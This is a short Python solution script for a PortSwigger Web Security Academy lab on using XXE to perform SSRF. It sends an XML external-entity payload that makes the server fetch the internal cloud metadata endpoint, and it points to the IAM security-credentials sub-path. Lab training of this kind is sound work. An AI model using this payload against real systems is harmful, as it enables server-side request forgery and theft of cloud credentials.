"""
Lab 2: Exploiting XXE to perform SSRF attacks
https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
Difficulty: Apprentice

📝 Same primitive as Lab 1, http:// target instead of file:// — points at
the internal cloud metadata endpoint the lab wants you to reach.
"""

from utils import get_session, log, note, build_basic_xxe

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
STOCK_CHECK_PATH = "/product/stock"
INTERNAL_URL = "http://169.254.169.254/latest/meta-data/"  # classic cloud metadata SSRF target


def run():
    s = get_session()

    xml = build_basic_xxe(INTERNAL_URL, extra_fields="<storeId>1</storeId>")
    note(f"Payload:\n{xml}")

    r = s.post(f"{TARGET}{STOCK_CHECK_PATH}", data=xml.encode(),
                headers={"Content-Type": "application/xml"})
    log(f"Response status: {r.status_code}")
    print(r.text)

    note("If the metadata root doesn't reflect anything useful, try a more")
    note("specific sub-path (e.g. .../latest/meta-data/iam/security-credentials/)")
    note("to reach the lab's actual internal admin interface, per its hint text.")


if __name__ == "__main__":
    run()
